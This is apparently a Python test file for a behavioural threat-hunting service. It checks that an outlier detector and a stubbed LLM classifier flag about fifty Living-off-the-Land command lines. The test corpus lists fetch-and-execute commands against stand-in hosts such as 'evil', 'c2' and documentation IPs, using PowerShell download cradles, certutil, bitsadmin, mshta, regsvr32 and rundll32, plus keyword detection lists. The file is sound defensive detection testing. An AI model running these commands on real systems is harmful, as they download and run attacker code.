"""Golden detection test for the Behavioral Hunter (#114 Phase A).

End-to-end (service layer, in-memory SQLite, stubbed classifier): build a
benign baseline for a workstation, then inject a synthetic Living-off-the-
Land sequence — an encoded-PowerShell child of ``winword.exe`` — and assert
the OutlierDetector flags it and the (stubbed) IntentClassifier rates it
suspicious/malicious. A small, fast, deterministic subset of the real
pipeline; no embedding service or live model required.

The bottom half is the >=50-event golden *set* (task D): a corpus of known
Living-off-the-Land command lines run through the real embedding bridge
(``behavioral_ingest_service``) + detector, asserting the acceptance floors —
>=80% flagged as outliers and >=60% classified suspicious/malicious.
"""

from datetime import UTC, datetime, timedelta

from btagent_shared.types.behavioral import EntityKind, IntentLabel, ProfileType
from btagent_shared.utils.ids import generate_id

from btagent_backend.db.models import DEFAULT_ORG_ID, OrganizationRow
from btagent_backend.services import behavioral_ingest_service as ingest
from btagent_backend.services import behavioral_intent_service as intent_svc
from btagent_backend.services import behavioral_service as svc
from btagent_backend.services.embedding_service import EmbeddingService

# A 4-dim toy embedding space standing in for the real cmdline-embedding model.
# Benign developer/admin command lines cluster on the first axis; the LotL
# encoded-PowerShell command is orthogonal (worst-case cosine distance).
_BENIGN_VECTORS = [
    [1.0, 0.0, 0.0, 0.0],
    [0.98, 0.02, 0.0, 0.0],
    [0.95, 0.05, 0.0, 0.0],
    [0.97, 0.0, 0.03, 0.0],
]
_BENIGN_PATTERNS = [
    "explorer.exe>cmd.exe",
    "explorer.exe>code.exe",
    "services.exe>svchost.exe",
    "explorer.exe>cmd.exe",
]
# The malicious event: winword.exe spawning encoded PowerShell — a classic
# LotL parent/child anomaly that does not appear in the benign baseline.
_LOTL_VECTOR = [0.0, 0.0, 0.0, 1.0]
_LOTL_PATTERN = "winword.exe>powershell.exe -enc"
_LOTL_EXCERPT = (
    "winword.exe -> powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA..."
)


def _suspicious_then_malicious_llm():
    """Stub LLM: FAST screen rates suspicious, STANDARD promotion confirms malicious."""

    async def _call(system: str, user: str, tier: str) -> str:
        # The untrusted event excerpt must have reached the prompt, fenced.
        assert "<external-data>" in user
        assert "winword.exe" in user
        if tier == "fast":
            return '{"intent": "suspicious", "rationale": "encoded pwsh, rare parent/child"}'
        return (
            '{"intent": "malicious", "rationale": '
            '"LotL: winword.exe spawned encoded PowerShell, far from baseline"}'
        )

    return _call


async def test_lotl_sequence_is_detected_and_rated_malicious(db_session):
    # 1. Build a benign baseline for the workstation.
    entity = await svc.upsert_entity(
        db_session,
        org_id=DEFAULT_ORG_ID,
        kind=EntityKind.HOST,
        canonical_id="WS-GOLDEN",
    )
    now = datetime.now(UTC)
    profile = await svc.build_baseline(
        db_session,
        entity=entity,
        profile_type=ProfileType.CMDLINE_EMBEDDING,
        vectors=_BENIGN_VECTORS,
        pattern_keys=_BENIGN_PATTERNS,
        window_start=now - timedelta(days=30),
        window_end=now,
    )
    assert profile.sample_size == len(_BENIGN_VECTORS)
    assert _LOTL_PATTERN not in profile.frequency_map  # never observed benignly

    # 2. Inject the LotL event -> the OutlierDetector must flag it.
    outlier = await svc.detect_outlier(
        db_session,
        entity=entity,
        profile_type=ProfileType.CMDLINE_EMBEDDING,
        event_id="evt_lotl_golden",
        event_vector=_LOTL_VECTOR,
        event_pattern_key=_LOTL_PATTERN,
        raw_event_excerpt=_LOTL_EXCERPT,
    )
    assert outlier is not None, "LotL encoded-PowerShell sequence must be flagged as an outlier"
    assert outlier.cosine_distance > 0.9  # orthogonal to the benign centroid
    assert outlier.frequency_rank == 0  # never-before-seen parent/child pattern
    assert outlier.intent_label is None  # not yet classified

    # 3. The (stubbed) IntentClassifier rates it suspicious/malicious.
    classified = await intent_svc.classify_outlier(
        db_session, outlier_id=outlier.id, llm=_suspicious_then_malicious_llm()
    )
    assert classified is not None
    assert classified.intent_label in {IntentLabel.SUSPICIOUS.value, IntentLabel.MALICIOUS.value}
    assert classified.intent_label == IntentLabel.MALICIOUS.value  # confirming pass wins

    # 4. Promotion lands it in the #119 HuntFinding queue with high severity.
    finding_id = await svc.promote_outlier(
        db_session, outlier_id=outlier.id, technique_ids=["T1059.001", "T1566"]
    )
    assert finding_id.startswith("hfnd_")
    refreshed = await svc.get_outlier(db_session, outlier.id)
    assert refreshed.promoted_to_finding_id == finding_id


async def test_benign_variation_does_not_flag(db_session):
    # Control: a command line near the benign centroid (even with a slightly
    # new pattern) is NOT flagged — guards against the golden test passing
    # because everything trips the detector.
    entity = await svc.upsert_entity(
        db_session, org_id=DEFAULT_ORG_ID, kind=EntityKind.HOST, canonical_id="WS-GOLDEN-CTRL"
    )
    now = datetime.now(UTC)
    await svc.build_baseline(
        db_session,
        entity=entity,
        profile_type=ProfileType.CMDLINE_EMBEDDING,
        vectors=_BENIGN_VECTORS,
        pattern_keys=_BENIGN_PATTERNS,
        window_start=now - timedelta(days=30),
        window_end=now,
    )
    out = await svc.detect_outlier(
        db_session,
        entity=entity,
        profile_type=ProfileType.CMDLINE_EMBEDDING,
        event_id="evt_benign_variation",
        event_vector=[0.99, 0.01, 0.0, 0.0],  # near the benign centroid
        event_pattern_key="explorer.exe>notepad.exe",
    )
    assert out is None


# =========================================================================== #
# The >=50-event golden SET (task D)
# =========================================================================== #

# A deterministic "semantic" cmdline embedder: benign dev/admin commands cluster
# on axis 0; each Living-off-the-Land family lands on its own orthogonal axis, so
# any LotL command is maximally distant from the benign baseline centroid. Stands
# in for the real cmdline-embedding model (the hash-based ``MockEmbeddingService``
# saturates cosine distance, so it can't exercise the distance half of the
# detector). Axes: [benign, encoded_pwsh, download_exec, certutil, mshta,
# script_host].
_ENCODED_PWSH = ("-enc", "-encodedcommand", "-w hidden", "-nop", "hidden")
_DOWNLOAD_EXEC = ("downloadstring", "downloadfile", "iex", "invoke-expression", "frombase64string")
_SCRIPT_HOST = ("regsvr32", "rundll32", "bitsadmin", "wmic", "cscript", "wscript", "scrobj")


def _cmdline_axis(cmdline: str) -> list[float]:
    c = cmdline.lower()
    if "certutil" in c:
        return [0.0, 0.0, 0.0, 1.0, 0.0, 0.0]
    if "mshta" in c or ".hta" in c:
        return [0.0, 0.0, 0.0, 0.0, 1.0, 0.0]
    if any(k in c for k in _SCRIPT_HOST):
        return [0.0, 0.0, 0.0, 0.0, 0.0, 1.0]
    if any(k in c for k in _DOWNLOAD_EXEC):
        return [0.0, 0.0, 1.0, 0.0, 0.0, 0.0]
    if any(k in c for k in _ENCODED_PWSH):
        return [0.0, 1.0, 0.0, 0.0, 0.0, 0.0]
    return [1.0, 0.0, 0.0, 0.0, 0.0, 0.0]  # benign cluster


class _CmdlineToyEmbedder(EmbeddingService):
    @property
    def provider_name(self) -> str:
        return "toy-cmdline"

    async def generate_embeddings(self, texts: list[str]) -> list[list[float]]:
        return [_cmdline_axis(t) for t in texts]


# Benign process-creation telemetry (the learned baseline): ordinary developer /
# workstation activity, whose parent>child lineages are all distinct from the
# LotL corpus below.
_BENIGN_SET = [
    ("explorer.exe", "cmd.exe", "cmd.exe /c dir"),
    ("explorer.exe", "chrome.exe", "chrome.exe --new-window"),
    ("Code.exe", "git.exe", "git.exe fetch --all --prune"),
    ("Code.exe", "python.exe", "python.exe -m pytest -q"),
    ("services.exe", "svchost.exe", "svchost.exe -k netsvcs -p"),
    ("explorer.exe", "OUTLOOK.EXE", "OUTLOOK.EXE /recycle"),
    ("explorer.exe", "Teams.exe", "Teams.exe --process-start-args"),
    ("services.exe", "MsMpEng.exe", "MsMpEng.exe"),
]

# The golden LotL corpus (>=50 known Living-off-the-Land events). Each is an
# anomalous parent>child lineage (Office / script host spawning a LOLBin) whose
# command line carries a recognizable LotL indicator.
_LOTL_SET = [
    # --- Encoded PowerShell spawned by Office apps ---
    (
        "winword.exe",
        "powershell.exe",
        "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A",
    ),
    ("excel.exe", "powershell.exe", "powershell.exe -NoProfile -EncodedCommand SQBFAFgA"),
    ("powerpnt.exe", "powershell.exe", "powershell -w hidden -enc RwBlAHQALQBDAG8AbgB0AGUAbgB0"),
    ("outlook.exe", "powershell.exe", "powershell.exe -nop -ep bypass -enc VABlAHMAdA=="),
    ("winword.exe", "powershell.exe", "powershell -windowstyle hidden -enc QQBBAEEA"),
    ("excel.exe", "powershell.exe", "powershell.exe -nop -w hidden -e ZQBjAGgAbwA="),
    ("mspub.exe", "powershell.exe", "powershell -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA="),
    ("visio.exe", "powershell.exe", "powershell.exe -NoP -NonI -W Hidden -Enc SQBuAHYAbwBrAGUA"),
    # --- PowerShell download-cradles ---
    (
        "winword.exe",
        "powershell.exe",
        "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://evil/a')",
    ),
    ("outlook.exe", "powershell.exe", "powershell -nop -c iex(iwr http://evil/p.ps1 -useb)"),
    (
        "wscript.exe",
        "powershell.exe",
        "powershell.exe -c (New-Object Net.WebClient).DownloadFile('http://evil/x.exe','%TEMP%\\x.exe')",
    ),
    (
        "mshta.exe",
        "powershell.exe",
        "powershell -c IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('...')))",
    ),
    (
        "excel.exe",
        "powershell.exe",
        "powershell -w hidden -c Invoke-Expression (Invoke-WebRequest http://evil/s)",
    ),
    ("winword.exe", "powershell.exe", "powershell -c IEX (iwr -Uri http://198.51.100.5/a.ps1)"),
    (
        "services.exe",
        "powershell.exe",
        "powershell.exe -c iex((New-Object Net.WebClient).DownloadString('http://c2/b'))",
    ),
    (
        "chrome.exe",
        "powershell.exe",
        "powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://evil/z')",
    ),
    # --- certutil download / decode ---
    (
        "winword.exe",
        "certutil.exe",
        "certutil.exe -urlcache -split -f https://evil-c2/payload.bin C:\\Temp\\svc.exe",
    ),
    ("cmd.exe", "certutil.exe", "certutil -urlcache -f http://evil/p.exe p.exe"),
    ("excel.exe", "certutil.exe", "certutil.exe -decode encoded.b64 payload.exe"),
    (
        "powershell.exe",
        "certutil.exe",
        "certutil -urlcache -split -f http://198.51.100.9/m.exe m.exe",
    ),
    ("wscript.exe", "certutil.exe", "certutil.exe -verifyctl -f -split http://evil/x.crt"),
    ("outlook.exe", "certutil.exe", "certutil -urlcache -split -f https://mal/a.dll a.dll"),
    ("mshta.exe", "certutil.exe", "certutil -decodehex in.hex out.exe"),
    (
        "services.exe",
        "certutil.exe",
        "certutil.exe -urlcache -split -f http://c2/loader.bin loader.bin",
    ),
    # --- mshta remote scriptlets ---
    ("winword.exe", "mshta.exe", "mshta.exe http://evil/a.hta"),
    ("excel.exe", "mshta.exe", "mshta http://198.51.100.7/x.hta"),
    ("outlook.exe", "mshta.exe", "mshta.exe javascript:a=GetObject('script:http://evil/s.sct')"),
    ("explorer.exe", "mshta.exe", 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"")")'),
    ("cmd.exe", "mshta.exe", "mshta.exe https://mal.example/payload.hta"),
    ("powerpnt.exe", "mshta.exe", "mshta http://evil/loader.hta"),
    # --- regsvr32 squiblydoo ---
    ("winword.exe", "regsvr32.exe", "regsvr32 /s /n /u /i:http://evil/x.sct scrobj.dll"),
    ("excel.exe", "regsvr32.exe", "regsvr32.exe /s /u /i:https://mal/a.sct scrobj.dll"),
    ("cmd.exe", "regsvr32.exe", "regsvr32 /s /i:http://198.51.100.11/s.sct scrobj.dll"),
    ("wscript.exe", "regsvr32.exe", "regsvr32.exe /s /n /i:http://evil/b.sct scrobj.dll"),
    ("outlook.exe", "regsvr32.exe", "regsvr32 /s /u /i:http://c2/c.sct scrobj.dll"),
    # --- rundll32 abuse ---
    (
        "winword.exe",
        "rundll32.exe",
        'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";document.write()',
    ),
    ("excel.exe", "rundll32.exe", "rundll32 shell32.dll,ShellExec_RunDLL powershell -enc ZQ=="),
    ("cmd.exe", "rundll32.exe", "rundll32.exe C:\\Temp\\evil.dll,StartW"),
    ("mshta.exe", "rundll32.exe", "rundll32 url.dll,OpenURL http://evil/x"),
    ("services.exe", "rundll32.exe", "rundll32.exe C:\\ProgramData\\a.dll,#1"),
    # --- bitsadmin transfer ---
    ("winword.exe", "bitsadmin.exe", "bitsadmin /transfer j http://evil/p.exe C:\\Temp\\p.exe"),
    (
        "cmd.exe",
        "bitsadmin.exe",
        "bitsadmin /transfer job /download http://198.51.100.3/x.exe x.exe",
    ),
    ("excel.exe", "bitsadmin.exe", "bitsadmin.exe /create /transfer m http://mal/a.dll a.dll"),
    ("outlook.exe", "bitsadmin.exe", "bitsadmin /transfer q https://c2/loader.exe loader.exe"),
    # --- wmic process call create ---
    ("winword.exe", "wmic.exe", 'wmic process call create "powershell -enc ZQBjAGgAbwA="'),
    (
        "excel.exe",
        "wmic.exe",
        'wmic process call create "cmd /c certutil -urlcache -f http://evil/p p"',
    ),
    ("cmd.exe", "wmic.exe", 'wmic /node:target process call create "malware.exe"'),
    # --- wscript / cscript ---
    ("winword.exe", "wscript.exe", "wscript.exe C:\\Users\\Public\\update.vbs //B"),
    ("outlook.exe", "cscript.exe", "cscript //nologo C:\\Temp\\a.js http://evil/c2"),
    ("excel.exe", "wscript.exe", "wscript C:\\ProgramData\\loader.js"),
    ("explorer.exe", "cscript.exe", "cscript.exe //E:jscript C:\\Temp\\x.txt"),
    # --- a couple more encoded-pwsh from unusual parents ---
    ("w3wp.exe", "powershell.exe", "powershell -nop -w hidden -enc UwBoAGUAbABs"),
    ("sqlservr.exe", "powershell.exe", "powershell.exe -EncodedCommand RABvAHcAbgBsAG8AYQBk"),
    ("wmiprvse.exe", "powershell.exe", "powershell -w hidden -nop -enc RwBlAHQA"),
]


def _lotl_screen_then_confirm_llm():
    """Deterministic keyword classifier: FAST screen rates non-benign; STANDARD
    confirms malicious for strong indicators, else suspicious."""

    async def _call(system: str, user: str, tier: str) -> str:
        # Untrusted excerpt must have reached the prompt, fenced.
        assert "<external-data>" in user
        c = user.lower()
        strong = any(
            k in c
            for k in (
                "-enc",
                "encodedcommand",
                "certutil",
                "mshta",
                "downloadstring",
                "iex",
                "frombase64",
                "bitsadmin",
                "scrobj",
            )
        )
        if tier == "fast":
            return (
                '{"intent": "malicious", "rationale": "strong LotL indicator"}'
                if strong
                else '{"intent": "suspicious", "rationale": "anomalous parent/child lineage"}'
            )
        return (
            '{"intent": "malicious", "rationale": "confirmed Living-off-the-Land"}'
            if strong
            else '{"intent": "suspicious", "rationale": "anomalous but unconfirmed"}'
        )

    return _call


async def _seed_golden_org(db) -> str:
    org_id = generate_id("org")
    db.add(OrganizationRow(id=org_id, name="behav-golden", created_at=datetime.now(UTC)))
    await db.flush()
    return org_id


async def test_golden_lotl_set_meets_detection_and_classification_floors(db_session):
    """>=50 known-LotL events: >=80% flagged as outliers, >=60% rated non-benign.

    Runs the full last-mile pipeline — embedding bridge -> OutlierDetector ->
    IntentClassifier — against a dedicated org (shared-DB isolation rule).
    """
    embedder = _CmdlineToyEmbedder()
    org_id = await _seed_golden_org(db_session)

    entity = await svc.upsert_entity(
        db_session, org_id=org_id, kind=EntityKind.HOST, canonical_id="WS-GOLDEN-SET"
    )
    now = datetime.now(UTC)
    await ingest.build_baseline_from_events(
        db_session,
        entity=entity,
        events=[
            ingest.ProcessEvent(
                event_id=f"benign_{i}",
                entity_canonical_id="WS-GOLDEN-SET",
                cmdline=cmd,
                process_name=child,
                parent_name=parent,
            )
            for i, (parent, child, cmd) in enumerate(_BENIGN_SET)
        ],
        window_start=now - timedelta(days=30),
        window_end=now,
        embedding_service=embedder,
    )

    total = len(_LOTL_SET)
    assert total >= 50, f"golden set must have >=50 LotL events, has {total}"

    flagged = 0
    non_benign = 0
    for i, (parent, child, cmd) in enumerate(_LOTL_SET):
        event = ingest.ProcessEvent(
            event_id=f"lotl_{i}",
            entity_canonical_id="WS-GOLDEN-SET",
            cmdline=cmd,
            process_name=child,
            parent_name=parent,
        )
        outlier = await ingest.score_event(
            db_session, entity=entity, event=event, embedding_service=embedder
        )
        if outlier is None:
            continue
        flagged += 1
        classified = await intent_svc.classify_outlier(
            db_session, outlier_id=outlier.id, llm=_lotl_screen_then_confirm_llm()
        )
        if classified is not None and classified.intent_label in {
            IntentLabel.SUSPICIOUS.value,
            IntentLabel.MALICIOUS.value,
        }:
            non_benign += 1

    flagged_rate = flagged / total
    non_benign_rate = non_benign / total
    assert flagged_rate >= 0.80, f"only {flagged}/{total} ({flagged_rate:.0%}) flagged as outliers"
    assert non_benign_rate >= 0.60, (
        f"only {non_benign}/{total} ({non_benign_rate:.0%}) classified suspicious/malicious"
    )
